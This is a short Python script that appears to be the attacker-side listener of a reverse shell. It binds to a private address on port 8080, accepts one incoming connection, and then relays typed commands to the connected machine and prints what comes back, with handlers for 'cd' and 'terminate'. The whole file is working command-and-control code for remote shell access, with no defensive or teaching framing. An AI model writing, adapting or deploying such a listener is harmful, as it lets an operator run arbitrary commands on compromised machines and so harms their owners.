import socket
import os

def connect():
    print("=" * 50)
    print("[+] Listening for incoming TCP connections on port 8080")
    mySocket = socket.socket()
    mySocket.bind(("192.168.83.128", 8080)) 
    mySocket.listen(1)
    connection, address = mySocket.accept()

    print("=" * 50)
    print(f"Connection established: {address}")

    while True:
        command = input("Shell > ")

        if "terminate" in command:
            connection.send("terminate".encode())
            connection.close()
            break
        elif command.startswith("cd "):
            connection.send(command.encode())
            response = connection.recv(1024).decode()
            print(response)
        else:
            connection.send(command.encode())
            response = connection.recv(1024).decode()
            print(response if response else "[!] No output returned.")

def main():
    connect()

if __name__ == "__main__":
    main()
